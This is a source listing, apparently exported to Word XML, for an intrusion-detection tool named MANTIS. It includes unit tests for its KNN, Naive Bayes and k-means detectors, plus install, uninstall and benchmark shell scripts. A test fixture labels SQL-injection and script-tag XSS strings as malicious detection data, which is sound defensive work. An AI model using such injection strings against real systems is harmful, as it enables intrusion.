    <w:p w14:paraId="1BDD74C7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src/tests/test_training_and_eval.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D5BDA1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(150 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D879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tests for the training + evaluation pipelines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CBE6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json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57597A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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB11C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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B980E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tempfile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637495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import unittest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A94E63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D4FA1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HERE = os.path.dirname(os.path.abspath(__file__))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FCDB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SRC = os.path.dirname(HERE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="798B0E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SRC not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AF18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sys.path.insert(0, SRC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="665B13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0568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from evaluation import evaluate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D74EB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from training import loader, train</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297C4DB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0BF58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7B6D8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KNN_CSV = """unique_ports,packet_count,label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CAE97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1,5,Normal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0102A1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2,8,Normal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF62E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3,12,Normal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4FAA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50,60,Scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4A7A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100,200,Scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4643DB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500,1000,Scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343E43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53BBA90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15022B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PAYLOAD_CSV = """payload,label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4FE6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/index.html,Normal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464A7C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/about,Normal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="328B26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/home HTTP/1.1,Normal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F4D76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/?id=1 UNION SELECT,Malicious</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C1CC8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/?u=admin' OR 1=1 --,Malicious</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD070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GET /search?q=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;,Malicious</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4989D15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"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4731309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521712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EFF12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def _tmp_csv(text):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6651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 = tempfile.NamedTemporaryFile("w", suffix=".csv", delete=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1263B8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f.write(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169DF78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f.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452D09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 f.name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD4191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D3BAB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FAF927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TestLoader(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D91D2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test_knn_loader(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3A67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_tmp_csv(KNN_CSV)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A7BC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B05A8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 = loader.load_knn_csv(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6313A48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self.assertEqual(len(rows), 6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="039B47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self.assertEqual(rows[0][2], "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77231F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self.assertEqual(rows[-1][2], "Scan")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="196DC1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22B0B1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6F9E5D9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9797F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test_payload_loader(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35112E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_tmp_csv(PAYLOAD_CSV)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3A6AB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2F1BC8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 = loader.load_payload_csv(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57F97C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self.assertEqual(len(rows), 6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="192193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self.assertSetEqual({l for _, l in rows},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382DEC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{"Normal", "Malicious"})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C60E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4D1FC7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57276CC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84A0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test_missing_columns_raises(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61086D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_tmp_csv("foo,bar\n1,2\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B6DA6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589232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self.assertRaises(loader.DatasetError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B958C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loader.load_knn_csv(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334D741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3D6C3F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7CD099D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AB7F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test_cic_destination_port_is_not_used_as_unique_port_count(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7346AD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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="798A92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"Tot Fwd Pkts,Dst Port,Label\n50,0,DDoS\n40,443,Benign\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542D62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6C1D98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self.assertRaisesRegex(loader.DatasetError,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468141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"pre-aggregated.*unique_ports"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C9E1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loader.load_cic_iot2023(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D181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6E537E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1425A7E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3A681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test_cic_only_labels_scan_families_as_scan(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B7D4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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="187244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"packet_count,unique_ports,label\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72CB04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"1000,20,DDoS\n40,30,Recon-PortScan\n80,12,Benign\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716DED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213E20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rows = loader.load_cic_iot2023(p)["knn"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="676DA0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self.assertEqual([row[2] for row in rows],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A4D8D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["Normal", "Scan", "Normal"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1620B6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0002941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7DF7134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AACB45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E8E37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TestTrain(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E10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test_knn_keeps_rows(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6408D4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      rows = [[2, 8, "Normal"], [3, 12, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DD8F9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[50, 60, "Scan"], [100, 200, "Scan"]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD997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 = train.train_knn(rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="158689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self.assertEqual(b["k"], 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655E70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self.assertEqual(len(b["training_data"]), 4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="731EEB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2DDE0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test_naive_bayes_priors_sum_to_one(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EAA57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rows = [("GET /", "Normal"), ("GET /home", "Normal"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E132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("UNION SELECT", "Malicious"), ("OR 1=1", "Malicious")]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356976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 = train.train_naive_bayes(rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A04E4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self.assertAlmostEqual(b["prior_malicious"] + b["prior_safe"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CE34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1.0, places=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B68B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self.assertIn("UNION", b["likelihoods"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1C608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AAFE6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test_kmeans_returns_k_centroids(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49330C3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pts = [[10, 2], [12, 3], [200, 5], [250, 6], [20, 50], [25, 60]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46687F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 = train.train_kmeans(pts, k=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31DF3D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self.assertEqual(b["k"], 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4992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self.assertEqual(len(b["centroids"]), 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D808D1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B28C7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7C49A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class TestEvaluate(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C638E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test_knn_metrics(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626ECE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_tmp_csv(KNN_CSV)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE5712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3033618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 = evaluate.evaluate_knn(loader.load_knn_csv(p), brain={})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3148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self.assertGreaterEqual(r["accuracy"], 0.8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C62C4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self.assertEqual(r["engine"], "KNN (Port Scan)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649E0E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1E9CCC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006521E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2D35E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test_payload_metrics_have_keys(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DB94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p = _tmp_csv(PAYLOAD_CSV)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FE7A2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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145422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 = evaluate.evaluate_payload(loader.load_payload_csv(p),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ACF11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                    brain={})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F1D4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for k in ("precision", "recall", "f1", "accuracy",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7AB7D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     "confusion_matrix"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AEC80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self.assertIn(k, r)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E090D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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C5211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os.unlink(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6372A93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40D23B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def test_brain_round_trip(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4966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brain = {"knn": train.train_knn([[2, 8, "Normal"], [50, 60, "Scan"]]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E824C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 "_meta": {"trained_at": "test"}}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D77B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with tempfile.TemporaryDirectory() as d:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA9A0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out = os.path.join(d, "mantis_brain.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597E9D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written = train.write_brain(out, brain)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="697592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self.assertTrue(os.path.isfile(written))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E861A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with open(written) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59ACD01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    self.assertIn("knn", json.load(f))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B72E4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F77880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7A94D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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151E71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unittest.main(verbosity=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C069214" w14:textId="77777777" w:rsidR="00CF0850" w:rsidRPr="00B1592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Installation and Demo Shell Scripts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="331EED72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src/install.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448802A2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(134 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D9E0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#!/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3198FF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installer - works on most linux distros</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557FADA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set -e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E361A1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C93BB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"$EUID" -ne 0 ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A815B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run as root: sudo ./install.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8D40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1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F07A7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6C970CC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9D14D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detect distro</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D8535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DISTRO="unknown"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A52F0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PKG=""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ADD5D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INSTALL=""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="295FDA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-f /etc/os-release ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4443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. /etc/os-release</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EEEDF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DISTRO=$ID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF843C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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4D8189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76F46D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case "$DISTRO" in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22FDEA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ubuntu|debian|kali|raspbian|linuxmint|pop|elementary)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020E413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PKG="apt-get"; INSTALL="apt-get install -y --no-install-recommends" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E834D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fedora|rhel|centos|rocky|almalinux)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22400A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if command -v dnf &gt;/dev/null 2&gt;&amp;1; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DED29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PKG="dnf"; INSTALL="dnf install -y"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6111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else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CEAE83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PKG="yum"; INSTALL="yum install -y"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ADBAD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fi ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A266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arch|manjaro|endeavouros)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594697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PKG="pacman"; INSTALL="pacman -S --noconfirm --needed" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04248D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opensuse*|sles)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094B89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PKG="zypper"; INSTALL="zypper install -y" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E3BE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alpine)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090CBB9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PKG="apk"; INSTALL="apk add --no-cache" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4885ED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*)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FA9F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"[!] unknown distro '$DISTRO' - continuing with generic install" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC95D1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esac</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2105112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A6FB7D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"[*] distro: $DISTRO  pkg: ${PKG:-none}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AEBC50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1F2CA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python check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A544C9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! command -v python3 &gt;/dev/null 2&gt;&amp;1; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0B2F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python3 missing, trying to install..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2431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case "$PKG" in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6696DE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apt-get|dnf|yum|zypper|apk) $INSTALL python3 ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44EBAF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pacman) $INSTALL python ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C186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*) echo "[!] install python3 manually"; exit 1 ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4566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esac</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706AF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53064DF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3EA90F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PY_OK=$(python3 -c 'import sys; print(1 if sys.version_info &gt;= (3,6) else 0)')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48C92E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"$PY_OK" != "1" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691AEF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need python 3.6+"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4961F4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1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFE57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3181116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F851C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optional but useful tools</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70AE6E1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case "$PKG" in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC13F3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apt-get) $INSTALL iptables libcap2-bin || true ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A408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dnf|yum) $INSTALL iptables libcap || true ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF4C9F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pacman)  $INSTALL iptables libcap || true ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F423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zypper)  $INSTALL iptables libcap-progs || true ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B05B6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apk)     $INSTALL iptables libcap || true ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6531E0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esac</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="457323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D2996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warn if AF_PACKET not available (kernel/container case)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F78BD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HAS_AF=$(python3 -c 'import socket; print(1 if hasattr(socket,"AF_PACKET") else 0)' 2&gt;/dev/null || echo 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06107E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"$HAS_AF" != "1" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DFE4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AF_PACKET not available - sensor mode won't work but train/eval will"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4547A1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6805683C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27CB9A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INSTALL_DIR="/opt/mantis"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75EA75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BIN_DIR="/usr/local/bin"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E97C2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SUDO_BIN_DIR="/usr/bin"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1D68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SOURCE_DIR=$(pwd)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063124D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5E23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"$SOURCE_DIR" = "$INSTALL_DIR" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048284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"[*] in-place install"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2BF7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else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B32D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"[*] installing to $INSTALL_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF0383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rm -rf "$INSTALL_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DAA22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mkdir -p "$INSTALL_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1306C8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cp -r ./* "$INSTALL_DIR/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06338F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0316EF1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1DFEB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CRLF -&gt; LF for windows-edited files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266111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command -v sed &gt;/dev/null 2&gt;&amp;1; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F8DB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find "$INSTALL_DIR" -type f \( -name "*.py" -o -name "*.sh" -o -name "*.md" \) \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1359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-exec sed -i 's/\r$//' {} \; 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2352BE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3873F83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4065F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chmod +x "$INSTALL_DIR/main.py" "$INSTALL_DIR/dashboard_ui/siem.py" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139AC9F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"$INSTALL_DIR/sensor_node/sensor.py" "$INSTALL_DIR/benchmark.sh" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3441B0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"$INSTALL_DIR/demo_all_attacks.sh" "$INSTALL_DIR/replay.py" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="571F5CE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3AF2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mkdir -p "$BIN_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15643C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"$INSTALL_DIR/main.py" "$BIN_DIR/mantis"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416C36E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"$INSTALL_DIR/dashboard_ui/siem.py" "$BIN_DIR/mantis-siem"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F8390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"$INSTALL_DIR/training/train.py" "$BIN_DIR/mantis-train" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254251B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ln -sf "$INSTALL_DIR/evaluation/evaluate.py" "$BIN_DIR/mantis-eval" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4527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"$INSTALL_DIR/replay.py" "$BIN_DIR/mantis-replay" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040953C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"$INSTALL_DIR/benchmark.sh" "$BIN_DIR/mantis-benchmark" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E00A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ln -sf "$INSTALL_DIR/demo_all_attacks.sh" "$BIN_DIR/mantis-demo-attacks" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F731D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33FDC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Some sudo configurations use a restricted PATH that omits /usr/local/bin.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F140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Keep compatibility links for the commands that need to run through sudo so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293A5E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both `sudo mantis` and `sudo mantis-demo-attacks` resolve reliably.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F545F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"$SUDO_BIN_DIR" != "$BIN_DIR" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CE66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mkdir -p "$SUDO_BIN_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6351AA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ln -sf "$INSTALL_DIR/main.py" "$SUDO_BIN_DIR/mantis"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0368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ln -sf "$INSTALL_DIR/demo_all_attacks.sh" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C5D40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"$SUDO_BIN_DIR/mantis-demo-attacks"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5063D9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21AB1FB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CECED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capability so sensor runs without sudo (best effort - not always allowed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686E72E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PY_REAL=$(readlink -f "$(command -v python3)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703B01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command -v setcap &gt;/dev/null 2&gt;&amp;1 &amp;&amp; [ -x "$PY_REAL" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B66A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setcap 'cap_net_raw,cap_net_admin=eip' "$PY_REAL" 2&gt;/dev/null; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B1969F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"[+] capabilities set - you can run mantis without sudo"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2903CA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else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="116D34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"[!] setcap failed - just use 'sudo mantis'"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257CDE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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="426AA4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10327D8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C068A0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21E9C3D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"[done] mantis installed"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200A3F9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              # run sensor without sudo (when capabilities are available)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="443701D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sudo mantis         # run sensor with root privileges"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4F4BF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 --help"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3622CE1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mantis-siem         # web dashboard"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70488C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mantis-train --help # train from a dataset"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3CAC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mantis-eval --help  # evaluate accuracy"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B20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mantis-replay       # offline .pcap replay lab (no root, repeatable)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5B20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mantis-benchmark    # train + test + compare models (no root)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C05997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mantis-demo-attacks # live: scan + flood + SQLi (needs root + MANTIS running)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDD00A2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src/uninstall.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="026E2C9C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(38 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B203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#!/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6339A97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270E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Uninstallation Script</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135C722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Removes the tool from the Linux system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C94BF6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18090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1. Check for Root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2E27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"$EUID" -ne 0 ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C0A1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Error: Please run as root (sudo ./uninstall.sh)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760ED21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1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="319F5D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49DE7563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64A30B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"[*] Starting MANTIS Uninstallation..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173C40A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888AC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INSTALL_DIR="/opt/mantis"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A41AF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BIN_DIRS="/usr/local/bin /usr/bin"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44EE9B6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COMMANDS="mantis mantis-siem mantis-train mantis-eval mantis-replay mantis-benchmark mantis-demo-attacks mantis-server"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10CC791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F4E23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2. Remove Symlinks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B2C0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for BIN_DIR in $BIN_DIRS; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8370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"[*] Removing MANTIS symlinks from $BIN_DIR..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C81311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for COMMAND in $COMMANDS; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4344A90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LINK_PATH="$BIN_DIR/$COMMAND"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1546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if [ -L "$LINK_PATH" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173C08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rm "$LINK_PATH"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752ACA0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    echo "    - Removed $LINK_PATH"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059597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  fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D3C1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done</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B336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done</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A444E6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980A5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3. Remove Directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="076A4D2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-d "$INSTALL_DIR" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141E21F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"[*] Removing installation directory $INSTALL_DIR..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6309C9E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rm -rf "$INSTALL_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0994C1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    - Removed $INSTALL_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACD1FC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1A49037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15B9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228C80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"[SUCCESS] MANTIS Uninstalled Successfully!"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033B5E38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lastRenderedPageBreak/>
        <w:t>src/benchmark.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="179A3475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(114 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11DB232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#!/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDF83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MANTIS benchmark - train, test, evaluate, and print model comparison report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC1CFA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No root required. Run from src/:  ./benchmark.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="494818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set -e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DDEEB6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BFB04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SOURCE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &amp;&amp; pwd)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EC44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cd "$SOURCE_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E09606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18C3938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DATASETS="../datasets"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22005D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OUT_DIR="data"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02FE3A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BRAIN_BASE="$OUT_DIR/mantis_brain.json"</w:t>
